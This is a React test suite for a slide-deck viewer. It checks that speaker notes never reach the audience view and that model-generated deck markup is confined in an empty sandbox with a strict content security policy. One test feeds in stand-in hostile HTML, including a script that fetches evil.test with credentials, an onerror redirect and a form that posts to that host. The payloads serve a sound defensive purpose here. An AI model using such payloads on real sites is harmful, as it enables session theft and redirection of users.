import React from 'react';
import { createRoot, Root } from 'react-dom/client';
import { act } from 'react-dom/test-utils';
import DeckViewer from '../DeckViewer';
import { splitSlides, separateNotes, audienceDeck, containsNotes } from '../deckModel';
import { deckDocument, DECK_CSP, DECK_SANDBOX } from '../DeckFrame';

(globalThis as any).IS_REACT_ACT_ENVIRONMENT = true;

let container: HTMLDivElement;
let root: Root | null = null;

beforeEach(() => { container = document.createElement('div'); document.body.appendChild(container); });
afterEach(() => { act(() => root?.unmount()); root = null; container.remove(); });

const DECK = `
  <section><h1>The problem</h1><p>Couriers are routed by hand.</p>
    <aside class="notes">Do NOT mention the failed pilot.</aside></section>
  <section><h2>The moment</h2><p>Watch it route live.</p>
    <div class="speaker-notes">Breathe. Click slowly.</div></section>
  <section><h2>The guardrail</h2><p>It refuses when confidence is low.</p></section>`;

function mount(props: Partial<React.ComponentProps<typeof DeckViewer>> = {}) {
  act(() => {
    const r = createRoot(container);
    root = r;
    r.render(<DeckViewer deckHtml={DECK} title="Demo" {...props} />);
  });
}

const btn = (testid: string) => container.querySelector(`[data-testid="${testid}"]`) as HTMLButtonElement;
const click = (el: Element | null) => act(() => { el?.dispatchEvent(new MouseEvent('click', { bubbles: true })); });
const frameDoc = () => (container.querySelector('[data-testid="ps-deck-frame"]') as HTMLIFrameElement)?.getAttribute('srcdoc') || '';

/**
 * THE RULE THIS WHOLE FEATURE TURNS ON. Speaker notes must never reach the audience
 * view. Not styled small, not visually hidden — ABSENT from the markup. A note like
 * "do NOT mention the failed pilot" appearing behind a student mid-demo is a failure
 * nobody gets to undo.
 */
describe('the audience never sees the speaker notes', () => {
  it('strips notes from the markup, rather than hiding them with CSS', () => {
    const slides = splitSlides(DECK);
    const audience = audienceDeck(slides);
    expect(audience).not.toContain('failed pilot');
    expect(audience).not.toContain('Breathe');
    expect(containsNotes(audience)).toBe(false);
    // And it did not simply delete the slide along with the note.
    expect(audience).toContain('Couriers are routed by hand');
  });

  it('recognises several ways a note can be marked', () => {
    for (const markup of [
      '<section><p>x</p><aside class="notes">secret</aside></section>',
      '<section><p>x</p><aside data-notes>secret</aside></section>',
      '<section><p>x</p><div class="speaker-notes">secret</div></section>',
      '<section><p>x</p><div class="presenter-note">secret</div></section>',
      '<section><p>x</p><section class="note">secret</section></section>',
      '<section><p>x</p><!-- notes: secret --></section>',
    ]) {
      const { audienceHtml, notes } = separateNotes(markup);
      expect({ markup, leaked: audienceHtml.includes('secret') }).toEqual({ markup, leaked: false });
      expect(notes).toContain('secret');
    }
  });

  it('the audience frame is given markup with no notes in it', () => {
    mount();
    click(btn('ps-deck-mode'));          // switch to audience
    expect(frameDoc()).not.toContain('failed pilot');
    expect(container.querySelector('[data-testid="ps-deck-notes"]')).toBeNull();
  });

  it('presenter mode shows the notes for the slide the presenter is on', () => {
    mount();
    expect(container.querySelector('[data-testid="ps-deck-notes"]')!.textContent).toContain('failed pilot');
    click(btn('ps-deck-next'));
    expect(container.querySelector('[data-testid="ps-deck-notes"]')!.textContent).toContain('Breathe');
    // ...and never the previous slide's.
    expect(container.querySelector('[data-testid="ps-deck-notes"]')!.textContent).not.toContain('failed pilot');
  });

  it('says plainly when a slide has no notes, instead of showing an empty box', () => {
    mount();
    click(btn('ps-deck-next'));
    click(btn('ps-deck-next'));
    expect(container.querySelector('[data-testid="ps-deck-notes"]')!.textContent).toContain('No notes on this slide');
  });
});

/**
 * The deck came out of a language model, from a prompt partly built from text a
 * student typed, and it renders inside a portal holding an authenticated session.
 */
describe('generated markup is contained, not trusted', () => {
  it('runs in a sandbox with nothing enabled at all', () => {
    mount();
    const frame = container.querySelector('[data-testid="ps-deck-frame"]') as HTMLIFrameElement;
    expect(frame.getAttribute('sandbox')).toBe('');
    expect(DECK_SANDBOX).toBe('');
  });

  // allow-scripts would let injected script run; allow-same-origin would give it the
  // portal's cookies and localStorage. Together they are equivalent to no sandbox.
  it('never grants scripts, same-origin, top-navigation, forms or popups', () => {
    mount();
    const sandbox = (container.querySelector('[data-testid="ps-deck-frame"]') as HTMLIFrameElement).getAttribute('sandbox') || '';
    for (const token of ['allow-scripts', 'allow-same-origin', 'allow-top-navigation', 'allow-forms', 'allow-popups', 'allow-modals']) {
      expect(sandbox).not.toContain(token);
    }
  });

  it('carries a CSP that denies everything not named', () => {
    expect(DECK_CSP).toContain("default-src 'none'");
    expect(DECK_CSP).not.toMatch(/script-src/);
    expect(DECK_CSP).not.toMatch(/connect-src/);
    expect(deckDocument('<p>x</p>', 'T')).toContain('Content-Security-Policy');
  });

  it('is rendered from srcDoc, so no request is ever made for it', () => {
    mount();
    const frame = container.querySelector('[data-testid="ps-deck-frame"]') as HTMLIFrameElement;
    expect(frame.getAttribute('srcdoc')).toBeTruthy();
    expect(frame.getAttribute('src')).toBeNull();
  });

  it.each([
    ['a script tag', '<section><script>fetch("https://evil.test", {credentials:"include"})</script></section>'],
    ['an inline handler', '<section><img src=x onerror="top.location=\'https://evil.test\'"></section>'],
    ['a parent-navigating anchor', '<section><a href="https://evil.test" target="_top">go</a></section>'],
    ['a form post', '<section><form action="https://evil.test" method="post"><input name="t"></form></section>'],
    ['a nested iframe', '<section><iframe src="https://evil.test"></iframe></section>'],
  ])('%s is confined to the frame rather than reaching the portal', (_label, hostile) => {
    mount({ deckHtml: hostile });
    const frame = container.querySelector('[data-testid="ps-deck-frame"]') as HTMLIFrameElement;
    // The markup is still carried — we are containing it, not sanitising it — but the
    // frame it lives in can run nothing and reach nothing.
    expect(frame.getAttribute('sandbox')).toBe('');
    expect(frame.getAttribute('srcdoc')).toContain("default-src 'none'");
    // It never becomes a real element in the portal's own document.
    expect(container.querySelector('script')).toBeNull();
    expect(container.querySelector('form')).toBeNull();
  });
});

describe('a presenter can drive it without a mouse', () => {
  const key = (k: string) => act(() => {
    window.dispatchEvent(new KeyboardEvent('keydown', { key: k, bubbles: true }));
  });

  it('moves with the arrows, space, Home and End', () => {
    mount();
    expect(container.querySelector('[data-testid="ps-deck-position"]')!.textContent).toContain('1 of 3');
    key('ArrowRight');
    expect(container.querySelector('[data-testid="ps-deck-position"]')!.textContent).toContain('2 of 3');
    key(' ');
    expect(container.querySelector('[data-testid="ps-deck-position"]')!.textContent).toContain('3 of 3');
    key('ArrowLeft');
    expect(container.querySelector('[data-testid="ps-deck-position"]')!.textContent).toContain('2 of 3');
    key('End');
    expect(container.querySelector('[data-testid="ps-deck-position"]')!.textContent).toContain('3 of 3');
    key('Home');
    expect(container.querySelector('[data-testid="ps-deck-position"]')!.textContent).toContain('1 of 3');
  });

  it('does not run off either end', () => {
    mount();
    key('ArrowLeft');
    expect(container.querySelector('[data-testid="ps-deck-position"]')!.textContent).toContain('1 of 3');
    key('End'); key('ArrowRight');
    expect(container.querySelector('[data-testid="ps-deck-position"]')!.textContent).toContain('3 of 3');
  });

  // A presenter typing a note must not have the deck jump under them.
  it('leaves keys alone while someone is typing', () => {
    mount();
    const input = document.createElement('textarea');
    container.appendChild(input);
    act(() => { input.dispatchEvent(new KeyboardEvent('keydown', { key: 'ArrowRight', bubbles: true })); });
    expect(container.querySelector('[data-testid="ps-deck-position"]')!.textContent).toContain('1 of 3');
  });
});

describe('the timer tells the student the truth about their pacing', () => {
  it('starts stopped, so opening the deck is not a run', () => {
    mount({ targetSeconds: 300 });
    expect(btn('ps-deck-timer-toggle').textContent).toContain('Start');
  });

  it('shows the target alongside the elapsed time', () => {
    mount({ targetSeconds: 300 });
    expect(container.querySelector('[data-testid="ps-deck-timer"]')!.textContent).toContain('5:00');
  });

  it('is hidden in audience view — it is the presenter\'s instrument, not the room\'s', () => {
    mount({ targetSeconds: 300 });
    click(btn('ps-deck-mode'));
    expect(container.querySelector('[data-testid="ps-deck-timer"]')).toBeNull();
  });
});

describe('it degrades honestly', () => {
  it('a deck with no sections is one slide, not an error', () => {
    mount({ deckHtml: '<h1>Only this</h1><p>No sections at all.</p>' });
    expect(container.querySelector('[data-testid="ps-deck-position"]')!.textContent).toContain('1 of 1');
  });

  it('an empty deck says so rather than rendering an empty frame', () => {
    mount({ deckHtml: '' });
    expect(container.querySelector('[data-testid="ps-deck-empty"]')).not.toBeNull();
    expect(container.querySelector('[data-testid="ps-deck-frame"]')).toBeNull();
  });

  // The student may be presenting from a hotel lobby on someone else's laptop.
  it('needs nothing from the network to render', () => {
    const doc = deckDocument('<section><p>x</p></section>', 'T');
    expect(doc).not.toMatch(/<link\b/i);
    expect(doc).not.toMatch(/<script\b[^>]*\bsrc=/i);
    expect(doc).toContain('<style>');
  });
});
